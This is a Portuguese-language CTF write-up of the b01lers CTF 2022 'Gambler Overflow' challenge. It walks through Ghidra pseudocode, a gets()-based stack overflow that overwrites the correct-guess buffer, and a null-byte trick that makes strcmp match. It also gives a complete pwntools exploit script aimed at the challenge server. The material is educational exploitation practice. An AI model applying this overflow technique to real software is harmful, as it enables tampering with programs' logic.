---
layout: post
title: Gambler Overflow - [b01lers CTF]
date: 2022-04-27 22:26
author: obrerodrigues
comments: true
categories: [CTFs]
---
Caso queira acompanhar, o binário do challenge está [aqui](https://github.com/brerodrigues/exploit_drafts/tree/main/ctfing/b01lers_CTF_2022/gambler_overflow). E o link com as informações do evento [aqui](https://ctftime.org/event/1583).

Existe um óbvio buffer overflow que permite sobreescrever o valor que guarda o valor correto:

```
Welcome to the casino! A great prize awaits you when you hit 1000 coins ;)
Your current balance: 100
Guess me a string of length 4 with lowercase letters: aaaa
Your guess: aaaa
Correct word: pmbp
Bummer, you lost. -10 coins.
Your current balance: 90
Guess me a string of length 4 with lowercase letters: AAAAAAAABBBBBBBB
Your guess: AAAAAAAABBBBBBBB
Correct word: BBBBBBBB
Bummer, you lost. -10 coins.
Your current balance: 80
Guess me a string of length 4 with lowercase letters: 
```

Essa tese pode ser confirmada ao se analisar o pseudo código gerado pelo Ghidra da função `casino`, responsável por maior parte da lógica do programa:

```C++
void casino(void)

{
  int iVar1;
  long in_FS_OFFSET;
  int local_24;
  char user_input [8];
  char correct_guess [8];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("Welcome to the casino! A great prize awaits you when you hit 1000 coins ;)");
  memset(correct_guess,0,8);
  memset(user_input,0,8);
  do {
    if ((int)balance < 1) goto LAB_00101745;
    printf("Your current balance: %d\n",(ulong)balance);
    for (local_24 = 0; local_24 < 4; local_24 = local_24 + 1) {
      iVar1 = rand();
      correct_guess[local_24] = (char)iVar1 + (char)(iVar1 / 0x1a) * -0x1a + 'a';
    }
    printf("Guess me a string of length 4 with lowercase letters: ");
    gets(user_input);
    printf("Your guess: %s\n",user_input);
    printf("Correct word: %s\n",correct_guess);
    iVar1 = strcmp(correct_guess,user_input);
    if (iVar1 == 0) {
      printf("You won (wow)! +%d coins.\n",(ulong)bet_win);
      balance = bet_win + balance;
    }
    else {
      printf("Bummer, you lost. -%d coins.\n",(ulong)bet_loss);
      balance = balance - bet_loss;
    }
    if ((int)balance < 0) {
      puts("You lost your entire balance! Better luck next time...");
      goto LAB_00101745;
    }
  } while ((int)balance < 1000);
  give_flag();
LAB_00101745:
  puts("See you next time!");
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Pode se observar na linha 23 que o programa utiliza a função `gets` para obter o input do usuário, como `gets` não se importa com o tamanho do input, possibilita que seja armazenado em `user_input` um valor maior que os 8 chars previamente reservados, nos deixando sobreescrever os valores armazenados abaixo de `user_input` na stack. E logo abaixo de `user_input` na stack está, convenientemente, `correct_guess` com o valor pseudo aleatório gerado no looping iniciado na linha `36`.

Há um pequeno pulo do gato para ser bem sucedido ao explorar esse overflow. De que adianta poder trocar o valor de `correct_guess` se na hora da comparação os valores vão ser diferentes? Afinal, é necesário inserir um certo número de caracteres antes de se chegar na área de memória onde está `correct_guess` e na hora da comparação os dois valores não vão bater:

```
Guess me a string of length 4 with lowercase letters: AAAAAAAABBBBBBBB
Your guess: AAAAAAAABBBBBBBB
Correct word: BBBBBBBB
Bummer, you lost. -10 coins.
```

Todas as proteções populares estão habilitadas no binário (NX, PIE, Canaries), o que dificulta alguns tipos de ataque. Na linha `60` existe uma verificação que checka se o valor de `balance` é maior que `1000`. Caso seja, chama uma função que imprime a flag na tela. Como seria possível trapacear, já que controlamos o valor de `correct_guess`?

Aqui mora o momento que o gato dá seu pequeno pulo: na linha `47` é chamada a função `strcmp` para comparar `user_input` e `correct_guess`. `strcmp` foi feita para comparar duas strings e considera uma string uma sequência de caracteres finalizada por um NULL byte. Consegue entender onde quero chegar?

`gets`, diferente de `strcmp`, não se importa em consumir NULL bytes, ela vai lendo até encontrar um EOF (end of file, pode ser enviado com CTRL+D no terminal) ou um new line (um simples Enter). Então é possível inserir via `gets` uma string que formada por: 7 caracteres + NULL byte + 7 caracteres. Os primeiros 7 caracteres serão utilizados em `strcmp` como nosso input (ela vai desconsiderar o NULL byte e tudo que vier depois), e o segundo conjunto será o novo valor de `correct_guess`.

Aí vai o exploit que escrevi que provavelmente pode ser simplificado em apenas uma linha de código:

```python
#!/usr/bin/env python

from pwn import *

get_flag = False
chall_name = 'gambler_overflow'

def run_with_gdb(p):
    gdb.attach(p,'''
    b *main
    b *casino+280''')

def run_exploit(p, debug):
    if debug:
        run_with_gdb(p)
        

    overflow = (b'A' * 7) + b'\x00' + (b'A' * 7)

    while (True):
        output = p.recv(timeout=2).decode()
        #print(output)
        if "FLAG" in output:
            print(output)
        else:
            p.sendline(overflow)
            
    p.close()

if get_flag:
    p = remote('178.62.32.210', '30138')
    run_exploit(p, False)
else:
    process_full_path = './' + chall_name
    p = process(process_full_path)
    run_exploit(p, False)
```

e rodando:

```
[+] Starting local process './gambler_overflow': pid 7322
Your guess: AAAAAAA
Correct word: AAAAAAA
You won (wow)! +10 coins.
FLAG{isso_eh_a_flag_txt}

See you next time!
```
